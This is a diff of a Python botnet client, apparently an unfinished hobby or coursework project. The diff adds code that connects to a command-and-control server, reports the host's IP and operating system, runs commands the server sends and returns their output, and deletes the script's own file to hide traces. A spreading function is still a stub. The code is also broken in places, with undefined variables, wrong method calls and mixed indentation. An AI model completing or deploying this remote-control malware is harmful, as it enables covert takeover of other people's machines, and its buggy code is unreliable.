@@ -8,10 +8,11 @@ MODULE NAME: ______
 """
 
 try:
-    import socket 						# import socket for creating TCP connection.
-    from subprocess import PIPE, run	# import subprocess to execute system commands.
-    from os import devnull				# import devnull from os to send stderr to devnull.
-    from sys import exit				# import exit from sys to quit program when specified.
+	import socket 						# Import socket for creating TCP connection.
+	from subprocess import PIPE, run	# Import subprocess to execute system commands.
+	from os import devnull				# Import devnull from os to send stderr to devnull.
+	from sys import exit				# Import exit from sys to quit program when specified.
+	from platform import system         # Import system from platform to detect os.
 except Exception:
     exit(1)
     
@@ -28,9 +29,17 @@ def create_client_socket(ip_addr: str, port: int):
 			port (int): The port number of the C&C server to connect to.
 		
 		Returns:
-			This function Will return a socket object.
+			This function will return a socket object.
 	"""
-	pass
+	client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     # Initializing socket.
+    conn = (ip_addr, port)                                              # Connect to server IP/Port.
+    sock.connect(conn)                                                  # Connection made.
+    host = socket.gethostname()                                         # Get local host name in order to then get IP.
+    client_ip = socket.gethostbyname(host)                              # Get local IP using host name.
+    initial_message = "IP=" + client_ip + ",os=" + system()             # Send IP address and OS information.
+    sock.send(initial_message.encode())                                 # Send message with this host's IP back to the server.
+
+    return client_sock													# Return the created client socket.
 
 def self_delete(name: str):
     """This function will be invoked when the C&C server enter's the
@@ -42,9 +51,9 @@ def self_delete(name: str):
 		
 		Returns:
 			None
-
 	"""
-	pass
+	os.remove(name)             # Delete the local file to remove traces of our presence 
+	print("File Deleted")       # Print a confirmation
 	
 def propagate(name: str):
 	"""This function will create other instances of this file in 
@@ -57,7 +66,6 @@ def propagate(name: str):
 		Returns:
 			None
 	"""
-    pass
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -66,8 +74,8 @@ class WindowsBot:
 		that are specific to the Windows operating system.
 	"""
 	def __init__(self):
-        pass
-    
+		pass
+
 	def exec_windows_cmd(self, commnd: str):
 		"""This function will execute Windows commands requested by the C&C.
 			
@@ -77,17 +85,25 @@ class WindowsBot:
 			Returns:
 				Will return the output of the command that was executed.
 		"""
-		DEVNULL = open(devnull, 'w')
-		output = subprocess.run(cmd,
-								shell=True, 
-								stdout=PIPE, 
-								stderr=DEVNULL)
+		DEVNULL = open(devnull, 'w')                    # Open devnull file to send stderr to.
+		output = subprocess.run(cmd.split(),		    # Run command.
+								stdout=PIPE, 			# Pipe command to store in variable.
+								stderr=DEVNULL)			# Send standard error to devnull.
 		return output
 
 	def handle_request(self):
+		"""This function will handle all tasks related to request made by the server.
+
+			Arguments:
+				None
+
+			Returns:
+				None
 		"""
-		"""
-		pass
+		sock = create_client_socket()					# Store socket object.
+		command = sock.recv(1024).decode('utf-8')		# Receive command from server.
+		command_output = self.exec_linux_cmd(command)	# Execute command on machine and store the response.
+		sock.send(command_output)						# Send the output to the C&C server.
 		
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -111,18 +127,34 @@ class LinuxBot:
 		output = subprocess.run(cmd.split(),  			# Run command.
 								stdout=PIPE, 			# Pipe command to store in variable.
 								stderr=DEVNULL)			# Send standard error to devnull.
-								
+
 		return output
 
 	def handle_request(self):
+		"""This function will handle all tasks related to request made by the server.
+
+			Arguments:
+				None
+
+			Returns:
+				None
 		"""
-		"""
-		pass
+		sock = create_client_socket()					# Store socket object.
+		command = sock.recv(1024).decode('utf-8')		# Receive command from server.
+		command_output = self.exec_linux_cmd(command)	# Execute command on machine and store the response.
+		sock.send(command_output)						# Send the output to the C&C server.
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 def main():
-    pass
+	obj = None
+    OS = system()			# Determine operating system.
+	if OS == "Linux":		# Check if operating system is Linux.
+		obj = LinuxBot()	# If Linux, instantiate LinuxBot object.
+	else:
+		obj = WindowsBot()	# Else, instantiate WindowsBot object.
+
+	
 
 if __name__ == '__main__':
     main()
